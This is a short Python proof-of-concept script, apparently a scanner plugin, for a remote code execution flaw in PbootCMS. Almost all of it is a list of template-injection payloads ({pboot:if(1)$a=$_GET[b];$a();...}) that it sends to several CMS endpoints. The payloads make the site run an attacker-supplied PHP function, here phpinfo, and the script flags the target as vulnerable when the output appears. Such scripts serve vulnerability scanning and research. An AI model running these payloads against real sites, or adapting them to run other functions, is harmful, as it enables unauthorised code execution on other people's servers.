#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2018/12/4 下午4:52
# @Author  : w8ay
# @File    : pbootcms_rce.py
'''
referer: https://nosec.org/home/detail/2001.html
author: w8ay
'''
import HackRequests


def poc(arg, **kwargs):
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    payloads = ['/index.php/index/index?keyword={pboot:if(1)$a=$_GET[b];$a();//)})}}{/pboot:if}&b=phpinfo',

                '/index.php/Content/2?keyword={pboot:if(1)$a=$_GET[b];$a();//)})}}{/pboot:if}&b=phpinfo',

                '/index.php/List/2?keyword={pboot:if(1)$a=$_GET[b];$a();//)})}}{/pboot:if}&b=phpinfo',

                '/About/2?keyword={pboot:if(1)$a=$_GET[b];$a();//)})}}{/pboot:if}&b=phpinfo',

                '/index.php/Search/index?keyword={pboot:if(1)$a=$_GET[title];$a();//)})}}{/pboot:if}&title=phpinfo']
    hh = HackRequests.hackRequests()
    result = {}
    for payload in payloads:
        testurl = arg.strip() + payload
        r = hh.http(testurl, headers=headers)
        html = r.text()
        if r.status_code == 200 and 'allow_url_fopen' in html:
            result["name"] = "pbootcms远程执行漏洞"
            result["content"] = "存在远程执行漏洞，攻击者可以通过此执行任意php代码。"
            result["url"] = testurl
            result["log"] = r.log
            result["tag"] = "rce"
            return result
